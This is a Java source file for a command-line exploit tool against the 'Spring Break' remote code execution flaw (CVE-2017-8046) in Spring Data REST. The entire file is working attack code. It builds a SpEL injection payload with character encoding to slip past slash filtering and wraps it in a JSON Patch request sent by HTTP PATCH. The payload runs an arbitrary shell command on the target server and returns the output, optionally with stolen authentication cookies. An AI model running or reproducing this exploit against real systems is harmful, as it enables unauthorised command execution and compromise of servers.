package com.github.houssemba.mixtwitt;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPatch;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;

public class SpringBreakCve20178046 {
	/**
	 * Version string.
	 */
	private static final String VERSION = "v1.0 (2018-03-10)";

	/**
	 * The JSON Patch object.
	 */
	private static final String JSON_PATCH_OBJECT = "[{ \"op\" : \"replace\", \"path\" : \"%s\", \"value\" : \"pwned\" }]";

	/**
	 * This is a way to bypass the split and 'replace'
	 * logic performed by the framework on slashes.
	 */
	private static final String SLASH = "T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))";

	/**
	 * Used to encode chars.
	 */
	private static final String CHAR_ENCODING = "T(java.lang.Character).toChars(%d)[0]";

	/**
	 * Malicious payload.
	 */
	private static String PAYLOAD;

	// Malicious payload initialization.
	static {
		PAYLOAD = "T(org.springframework.util.StreamUtils).copy(";
		PAYLOAD += "T(java.lang.Runtime).getRuntime().exec(";
		PAYLOAD += "(";
		PAYLOAD += "T(java.lang.System).getProperty(\\\"os.name\\\").toLowerCase().contains(\\\"win\\\")";
		PAYLOAD += "?";
		PAYLOAD += "\\\"cmd \\\"+" + SLASH + "+\\\"c \\\"";
		PAYLOAD += ":";
		PAYLOAD += "\\\"\\\"";
		PAYLOAD += ")+";
		PAYLOAD += "%s"; // The encoded command will be placed here.
		PAYLOAD += ").getInputStream()";
		PAYLOAD += ",";
		PAYLOAD += "T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes()";
		PAYLOAD += ".getResponse().getOutputStream()";
		PAYLOAD += ").x";
	}

	/**
	 * Error cause string that can be used to "clean the response."
	 */
	private static final String ERROR_CAUSE = "{\"cause";

	/**
	 * The target URL.
	 */
	private URI url;

	/**
	 * The command that will be executed on the remote machine.
	 */
	private String command;

	/**
	 * Cookies that will be passed.
	 */
	private String cookies;

	/**
	 * Flag used to remove error messages in output due to
	 * the usage of the exploit. It could hide error messages
	 * if the request fails for other reasons.
	 */
	private boolean cleanResponse;

	/**
	 * Verbosity flag.
	 */
	private boolean verbose;

	/**
	 * Default constructor.
	 */
	private SpringBreakCve20178046() {
		this.verbose = false;
		this.cleanResponse = false;
	}

	/**
	 * Performs the exploit.
	 *
	 * @throws IOException
	 *             If something bad occurs during HTTP GET.
	 */
	private void exploit() throws IOException {
		checkInput();
		printInput();
		String payload = preparePayload();
		String response = httpPatch(payload);
		printOutput(response);
	}

	/**
	 * Checks the input.
	 */
	private void checkInput() {
		if (this.url == null) {
			throw new IllegalArgumentException("URL must be passed.");
		}

		if (isEmpty(this.command)) {
			throw new IllegalArgumentException("Command must be passed.");
		}
	}

	/**
	 * Prints input if verbose flag is true.
	 */
	private void printInput() {
		if (isVerbose()) {
			System.out.println("[*] Target URL ........: " + this.url);
			System.out.println("[*] Command ...........: " + this.command);
			System.out.println("[*] Cookies ...........: " + (isEmpty(this.cookies) ? "(no cookies)" : this.cookies));
		}
	}

	/**
	 * Prepares the payload.
	 *
	 * @return The malicious payload that will be injected.
	 */
	private String preparePayload() {
		System.out.println("[*] Preparing payload.");

		String command = encodingCommand(); // Encoding inserted command.
		String payload = String.format(PAYLOAD, command); // Preparing Java payload.
		payload = String.format(JSON_PATCH_OBJECT, payload); // Placing payload into JSON Patch object.

		if (isVerbose()) {
			System.out.println("[*] Payload ...........: " + payload);
		}

		return payload;
	}

	/**
	 * Encodes the inserted command.
	 * PROS: No problems in interpreting things.
	 * CONS: Payload too long.
	 *
	 * @return The encoded command.
	 */
	private String encodingCommand() {
		StringBuilder encodedCommand = new StringBuilder("T(java.lang.String).valueOf(new char[]{");

		int commandLength = this.command.length();
		for (int i = 0; i < commandLength; i++) {
			encodedCommand.append(String.format(CHAR_ENCODING, (int) this.command.charAt(i)));
			if (i + 1 < commandLength) {
				encodedCommand.append(",");
			}
		}

		encodedCommand.append("})");

		if (isVerbose()) {
			System.out.println("[*] Encoded command ...: " + encodedCommand.toString());
		}

		return encodedCommand.toString();
	}

	/**
	 * HTTP PATCH operation on the target passing the malicious payload.
	 *
	 * @param payload
	 *            The malicious payload.
	 * @return The response as a string.
	 * @throws IOException
	 *             If something bad occurs during HTTP GET.
	 */
	private String httpPatch(String payload) throws IOException {
		System.out.println("[*] Sending payload.");

		// Preparing PATCH operation.
		HttpClient client = HttpClientBuilder.create().build();
		HttpPatch patch = new HttpPatch(this.url);
		patch.setHeader("User-Agent", "Mozilla/5.0");
		patch.setHeader("Accept-Language", "en-US,en;q=0.5");
		patch.setHeader("Content-Type", "application/json-patch+json"); // This is a JSON Patch.
		if (!isEmpty(this.cookies)) {
			patch.setHeader("Cookie", this.cookies);
		}

		patch.setEntity(new StringEntity(payload));

		// Response string.
		StringBuilder response = new StringBuilder();

		// Executing PATCH operation.
		HttpResponse httpResponse = client.execute(patch);
		if (httpResponse != null) {

			// Reading response code.
			if (httpResponse.getStatusLine() != null) {
				int responseCode = httpResponse.getStatusLine().getStatusCode();
				System.out.println("[*] HTTP " + responseCode);
			} else {
				System.out.println("[!] HTTP response code can't be read.");
			}

			// Reading response content.
			if (httpResponse.getEntity() != null && httpResponse.getEntity().getContent() != null) {
				BufferedReader in = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
				String inputLine;

				while ((inputLine = in.readLine()) != null) {
					response.append(inputLine);
					response.append(System.getProperty("line.separator"));
				}
				in.close();
			} else {
				System.out.println("[!] HTTP response content can't be read.");
			}

		} else {
			System.out.println("[!] HTTP response is null.");
		}

		return response.toString();
	}

	/**
	 * Prints output.
	 *
	 * @param response
	 *            Response that will be printed.
	 */
	private void printOutput(String response) {
		if (!isEmpty(response)) {
			System.out.println("[*] vvv Response vvv");

			// Cleaning response (if possible).
			if (isCleanResponse() && response.contains(ERROR_CAUSE)) {
				String cleanedResponse = response.split("\\" + ERROR_CAUSE)[0];
				System.out.println(cleanedResponse);
			} else {
				System.out.println(response);
			}

			System.out.println("[*] ^^^ ======== ^^^");
		}
	}

	/**
	 * Checks if an input string is null/empty or not.
	 *
	 * @param input
	 *            The input string to check.
	 * @return True if the string is null or empty, false otherwise.
	 */
	private boolean isEmpty(String input) {
		return input == null || input.trim().length() < 1;
	}

	/* Getters and setters. */

	private boolean isVerbose() {
		return verbose;
	}

	private void setVerbose(boolean verbose) {
		this.verbose = verbose;
	}

	private void setUrl(String url) throws URISyntaxException {
		if (isEmpty(url)) {
			throw new IllegalArgumentException("URL must be not null and not empty.");
		}

		this.url = new URI(url.trim());
	}

	private void setCommand(String command) {
		if (isEmpty(command)) {
			throw new IllegalArgumentException("Command must be not null and not empty.");
		}

		this.command = command.trim();
	}

	private void setCookies(String cookies) {
		if (cookies != null) {
			cookies = cookies.trim();
		}

		this.cookies = cookies;
	}

	private boolean isCleanResponse() {
		return cleanResponse;
	}

	private void setCleanResponse(boolean cleanResponse) {
		this.cleanResponse = cleanResponse;
	}

	/**
	 * Shows the program help.
	 */
	private static void help() {
		System.out.println("Usage:");
		System.out.println("   java -jar spring-break_cve-2017-8046.jar [options]");
		System.out.println("Description:");
		System.out.println("   Exploiting 'Spring Break' Remote Code Execution (CVE-2017-8046).");
		System.out.println("Options:");
		System.out.println("   -h, --help");
		System.out.println("      Prints this help and exits.");
		System.out.println("   -u, --url [target_URL]");
		System.out.println("      The target URL where the exploit will be performed.");
		System.out.println("      You have to choose an existent resource.");
		System.out.println("   -cmd, --command [command_to_execute]");
		System.out.println("      The command that will be executed on the remote machine.");
		System.out.println("   --cookies [cookies]");
		System.out.println("      Optional. Cookies passed into the request, e.g. authentication cookies.");
		System.out.println("   --clean");
		System.out.println("      Optional. Removes error messages in output due to the usage of the");
		System.out.println("      exploit. It could hide error messages if the request fails for other reasons.");
		System.out.println("   -v, --verbose");
		System.out.println("      Optional. Increase verbosity.");
	}

	/**
	 * Main method.
	 *
	 * @param args
	 *            Input arguments
	 */
	public static void main(String[] args) {
		try {
			System.out.println("'Spring Break' RCE (CVE-2017-8046) - " + VERSION);
			SpringBreakCve20178046 o = new SpringBreakCve20178046();

			if (args.length > 0) {
				for (int i = 0; i < args.length; i++) {

					String p = args[i];

					if (("-h".equals(p) || "--help".equals(p)) && i == 0) {
						SpringBreakCve20178046.help();
						return;
					} else if ("-u".equals(p) || "--url".equals(p)) {

						if (i + 1 > args.length - 1) {
							throw new IllegalArgumentException("URL must be passed.");
						}
						o.setUrl(args[++i]);

					} else if ("-cmd".equals(p) || "--command".equals(p)) {

						if (i + 1 > args.length - 1) {
							throw new IllegalArgumentException("Command must be passed.");
						}
						o.setCommand(args[++i]);

					} else if ("--cookies".equals(p)) {

						if (i + 1 > args.length - 1) {
							throw new IllegalArgumentException("Cookies must be passed, if specified.");
						}
						o.setCookies(args[++i]);

					} else if ("--clean".equals(p)) {
						o.setCleanResponse(true);
					} else if ("-v".equals(p) || "--verbose".equals(p)) {
						o.setVerbose(true);
					}

				}

				// Performing the exploit.
				o.exploit();

			} else { // Wrong number of arguments.
				SpringBreakCve20178046.help();

				System.out.println();
				System.out.println("=========");
				System.out.println();
				o.setCommand("ls /tmp");
				o.setUrl("http://localhost:8080/api/users/1");
				o.exploit();
			}

		} catch (URISyntaxException use) {
			System.out.println("[!] Input error (URI syntax exception): " + use.getMessage());
		} catch (IllegalArgumentException iae) {
			System.out.println("[!] Input error (illegal argument): " + iae.getMessage());
		} catch (Exception e) {
			System.out.println("[!] Unexpected exception: " + e.getMessage());
			e.printStackTrace();
		}
	}
}
